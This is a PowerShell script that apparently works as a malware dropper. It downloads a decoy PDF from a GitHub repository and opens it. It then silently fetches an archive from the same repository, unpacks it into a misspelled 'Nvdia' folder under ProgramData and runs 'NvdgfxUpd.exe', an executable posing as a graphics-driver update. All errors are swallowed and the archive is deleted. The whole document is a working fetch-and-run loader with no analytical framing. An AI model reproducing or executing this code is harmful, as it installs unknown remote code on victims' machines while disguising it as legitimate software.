$ProgressPreference = 'SilentlyContinue'

$File1Url = "https://github.com/rosawatsn/lnk/raw/refs/heads/main/fls/doc.pdf"
$File2Url = "https://github.com/rosawatsn/lnk/raw/refs/heads/main/res/resource-wm"

$File1Path = "$env:TEMP\DOC856328978.pdf"

try {
    Invoke-WebRequest -Uri $File1Url -OutFile $File1Path -ErrorAction Stop
    Start-Process -FilePath $File1Path
} catch { }

$zipFileName = "NvdgfxUpd.zip"
$destinationFolder = "$env:ProgramData\Nvdia"
$zipFilePath = Join-Path -Path $destinationFolder -ChildPath $zipFileName

# The specific EXE name you expect inside the ZIP
$expectedExeName = "NvdgfxUpd.exe"

try {
    if (-Not (Test-Path -Path $destinationFolder)) {
        New-Item -ItemType Directory -Path $destinationFolder -Force | Out-Null
    }

    # Download the zip file
    if (-Not (Test-Path -Path $zipFilePath)) {
        Invoke-WebRequest -Uri $File2Url -OutFile $zipFilePath -ErrorAction Stop
    }

    # Extract zip contents directly into destination folder
    Expand-Archive -Path $zipFilePath -DestinationPath $destinationFolder -Force

    # Delete the zip file
    Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue

    # Build full path to the expected EXE
    $exePath = Join-Path -Path $destinationFolder -ChildPath $expectedExeName

    if (Test-Path $exePath) {
        Start-Process -FilePath $exePath
    }
} catch { }
